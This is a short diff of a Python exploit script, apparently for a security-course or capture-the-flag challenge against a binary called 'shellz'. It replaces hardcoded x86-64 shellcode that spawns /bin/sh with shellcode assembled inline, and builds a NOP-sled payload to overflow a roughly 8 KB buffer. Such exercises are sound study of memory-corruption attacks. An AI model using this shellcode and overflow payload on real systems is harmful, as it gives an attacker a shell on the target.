@@ -5,7 +5,7 @@ from ctypes import CDLL, c_uint, c_int, byref
 # 6447.lol 3002
 PROGRAM_PATH = (Path(__file__).parent / "shellz").resolve().__str__()
 BUFF_SIZE = 8192 + 8  # 0x2000
-SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+# SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 # Shellcode2 = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
 context.arch = "amd64"
 
@@ -20,7 +20,7 @@ myShellCode = f"""
     syscall
 """
 
-# SHELL_CODE = asm(myShellCode)
+SHELL_CODE = asm(myShellCode)
 PAYLOAD_SIZE = len(SHELL_CODE)
 WRAP_AROUND = 500
 
@@ -124,7 +124,7 @@ NOP = b"\x90"
 #     + p64(int_stack_addr, endianness="little")
 # )
 
-# TODO: WHY DOES THIS NOT WORK
+# TODO: WHY DOES THIS NOT WORK with 6841 shellcode
 payload = (
     NOP * (BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)
     + NOP * (NOP_SIZE)
